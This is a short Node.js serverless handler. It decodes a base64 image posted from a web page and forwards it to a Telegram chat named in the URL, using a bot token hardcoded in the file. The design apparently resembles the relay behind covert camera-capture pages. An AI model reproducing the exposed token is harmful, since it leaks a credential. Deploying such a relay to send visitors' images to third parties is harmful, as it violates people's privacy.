import fetch from "node-fetch";
import FormData from "form-data";

const BOT_TOKEN = "7525794586:AAH9YlfXazDX1zzx1ss23q8RuIqyMJcVzZI";
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

export default async function handler(req, res) {
  if (req.method !== "POST") return res.status(405).send("Method not allowed");

  const { cat } = req.body;
  const uid = req.query.uid;

  if (!cat || !uid) return res.status(400).send("Missing data");

  try {
    // Deteksi MIME type dan ambil base64-nya
    const match = cat.match(/^data:(image\/[a-zA-Z]+);base64,(.+)$/);
    if (!match) return res.status(400).send("Invalid base64 format");

    const mimeType = match[1];
    const base64Data = match[2];
    const buffer = Buffer.from(base64Data, "base64");

    // Cek ukuran buffer
    if (buffer.length < 5000) {
      return res.status(400).send("Image too small");
    }

    // Kirim ke Telegram pakai FormData
    const form = new FormData();
    form.append("chat_id", uid);
    form.append("caption", "📸 Gambar dari halaman kamu");
    form.append("photo", buffer, {
      filename: "image.png",
      contentType: mimeType,
    });

    const tgRes = await fetch(`${TELEGRAM_API}/sendPhoto`, {
      method: "POST",
      body: form,
    });

    const result = await tgRes.json();

    if (!result.ok) {
      console.error("Telegram Error:", result);
      return res.status(500).json({ error: result.description || "Failed to send photo" });
    }

    return res.status(200).json({ ok: true });
  } catch (err) {
    console.error("Error:", err);
    return res.status(500).send("Internal server error");
  }
}
